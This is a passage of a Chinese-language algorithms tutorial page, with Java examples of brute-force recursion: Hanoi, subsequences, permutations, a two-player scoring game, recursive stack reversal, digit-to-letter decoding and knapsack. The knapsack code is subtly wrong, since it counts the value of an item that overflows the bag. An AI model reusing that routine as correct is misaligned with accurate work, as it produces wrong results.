keyword">return</span> size1 <span class="token operator">></span> size2 <span class="token operator">?</span> head1 <span class="token operator">:</span> head2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> bigHeapComparator <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> o1<span class="token punctuation">,</span> <span class="token class-name">Integer</span> o2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> o2 <span class="token operator">-</span> o1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="暴力递归"><a href="#暴力递归" class="headerlink" title="暴力递归"></a>暴力递归</h2><p>1，把问题转化为规模缩小了的同类问题的子问题 </p><p>2，有明确的不需要继续进行递归的条件(base case) </p><p>3，有当得到了子问题的结果之后的决策过程 </p><p>4，不记录每一个子问题的解</p><h3 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h3><p>打印n层汉诺塔从最左边移动到最右边的全部过程</p><p>假设函数为P(i, from, to, other)</p><p>一共i层，从from柱子移动到to柱子，other代表其他的柱子</p><p>整个递归过程即为</p><p>1）将1 - i-1层的圆盘移动到other柱子   P(i-1, from, other, to)</p><p>2）将i层圆盘移动到to柱子   打印即可</p><p>3）将1 - i-1层的圆盘移动到to柱子    P(i-1, other, to, from)</p><blockquote><p>不需要考虑中间比如第1步或者第3步移动的过程中怎么保证大圆盘没有放到小圆盘上，这个问题交给第1步或者第3步的递归过程即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hanoi</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">P</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token string">"left"</span><span class="token punctuation">,</span> <span class="token string">"right"</span><span class="token punctuation">,</span> <span class="token string">"mid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">P</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token class-name">String</span> from<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token keyword">to</span><span class="token punctuation">,</span> <span class="token class-name">String</span> other<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Move 1 from "</span> <span class="token operator">+</span> from <span class="token operator">+</span> <span class="token string">" to "</span> <span class="token operator">+</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">P</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> from<span class="token punctuation">,</span> other<span class="token punctuation">,</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Move "</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> from <span class="token operator">+</span> <span class="token string">" to "</span> <span class="token operator">+</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">P</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> other<span class="token punctuation">,</span> <span class="token keyword">to</span><span class="token punctuation">,</span> from<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="子序列"><a href="#子序列" class="headerlink" title="子序列"></a>子序列</h3><p>打印字符串全部子序列，包括空字符串</p><p>从头开始，选择要该字符还是不要该字符，分出两条，随后分别递归</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm3_f3.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">allSubSequences</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>chars<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> chars<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">process</span><span class="token punctuation">(</span>chars<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> tmp <span class="token operator">=</span> chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 0用于占位，代表不要该字符（前提是原来的字符串中没有这个ASCII码为0的字符，ASCII码为0的字符为空字符）</span>    chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>chars<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h3><p>打印一个字符串的全部排列，要求不要出现重复的排列</p><p>0 - i-1 位置定好字符，从i位置之后的所有字符都可以放在i位置进行尝试（注意重复）, 定好i位置的字符，就进入下一层递归</p><p>process(int i, char[] chars)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">allPermutations</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> chars<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> tmp <span class="token operator">=</span> chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> chars<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">boolean</span><span class="token punctuation">[</span><span class="token punctuation">]</span> visit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">boolean</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span>j <span class="token operator">&lt;</span> chars<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>visit<span class="token punctuation">[</span>chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            visit<span class="token punctuation">[</span>chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>chars<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">process</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> chars<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>chars<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="分数最高"><a href="#分数最高" class="headerlink" title="分数最高"></a>分数最高</h3><p>arr=[1,2,100,4], A先拿，B后拿，双方都只能拿最左或最右的值，谁最后最大谁获胜</p><p>先手函数 f() 后手函数 s()</p><p>对于先手函数，base case: 即只剩一个数，当然返回该值</p><p>否则返回max[（拿了左边的+后手操作返回值）,（拿了右边的+后手操作返回值）]</p><p>对于后手函数，base case: 只剩一个数，既然是后手，那么该数当然不是自己拿，而是对方拿，所以返回0</p><p>否则返回min[（去掉左边值然后先手操作）,（去掉右边值然后先手操作）]</p><blockquote><p>为什么是最小值？因为这是后手函数，自己是后手，那么对方一定会选择对他优势更大的，所以留给自己的当然是较小值的情况</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">highestScore</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="递归逆序栈"><a href="#递归逆序栈" class="headerlink" title="递归逆序栈"></a>递归逆序栈</h3><p>不能使用额外数据结构</p><p>函数f: 拿出来栈底的值，其他值按原来顺序放好</p><p>每次弹出栈顶，递归调用直到为空，并且记录每次弹出的值，该值不是最后一个值就再压进去，把最后一个值一层一层往上返回</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> last <span class="token operator">=</span> <span class="token function">f</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> last<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">reverseStackUsingRecursive</span><span class="token punctuation">(</span><span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> last <span class="token operator">=</span> <span class="token function">f</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">reverseStackUsingRecursive</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>last<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数字转化字母"><a href="#数字转化字母" class="headerlink" title="数字转化字母"></a>数字转化字母</h3><p>1 - A 2-B 3-C … 26个字母皆如此，那么一个字符串”111”可以转化为”AAA”, “KA”, “AK”，则给定一个只有数字字符组成的字符串str，返回有多少种转化结果</p><p>0, …, i-1 位置定好转化目标，然后返回 i, …, length - 1的结果</p><p>检查位置i上的数字，</p><p>如果为0，那么无论如何都没法转化，整个决定错误，返回0</p><p>不为0，则一定可以将该位置转化为对应字母，返回i+1 - length-1的结果</p><p>然后分为该数字为1，2，其他</p><p>1）为1，则还可以跟下一个数字组合成一个两位数，转化为对应字母（如果存在下一个）</p><p>2）为2，并且下一个数字在0-6之间</p><p>3）其他数字，莫得办法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> str<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> str<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> str<span class="token punctuation">.</span>length<span class="token punctuation">)</span> res <span class="token operator">+=</span> <span class="token function">process</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> str<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'6'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> res <span class="token operator">+=</span> <span class="token function">process</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">convertToLetterString</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h3><p>给定两个长度都为N的数组weights和values，weights[i]和values[i]分别代表 i号物品的重量和价值。给定一个正数bag，表示一个载重bag的袋子，你装的物品不能超过这个重量。返回你能装下最多的价值是多少</p><p>依然是从头开始尝试，0, …, i-1 位置定好选择装哪个物品，并记录已装物品的重量，然后返回 i, …, length - 1的结果</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> weights<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values<span class="token punctuation">,</span> <span class="token keyword">int</span> bag<span class="token punctuation">,</span> <span class="token keyword">int</span> alreadyweight<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>alreadyweight <span class="token operator">></span> bag<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> weights<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>values<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token function">process</span><span class="token punctuation">(</span>weights<span class="token punctuation">,</span> values<span class="token punctuation">,</span> bag<span class="token punctuation">,</span> weights<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> alreadyweight<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token function">process</span><span class="token punctuation">(</span>weights<span class="token punctuation">,</span> values<span class="token punctuation">,</span> bag<span class="token punctuation">,</span> alreadyweight<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">Knapsack</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> weights<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values<span class="token punctuation">,</span> <span class="token keyword">int</span> bag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>weights <span class="token operator">==</span> <span class="token keyword">null</span><span class="token operator">||</span> values <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> weights<span class="token punctuation">.</span>length <span class="token operator">!=</span> values<span class="token punctuation">.</span>length <span class="token operator">||</span> values<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>weights<span class="token punctuation">,</span> values<span class="token punctuation">,</span> bag<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="N皇后问题"><a href="#N皇后问题" class="headerlink" 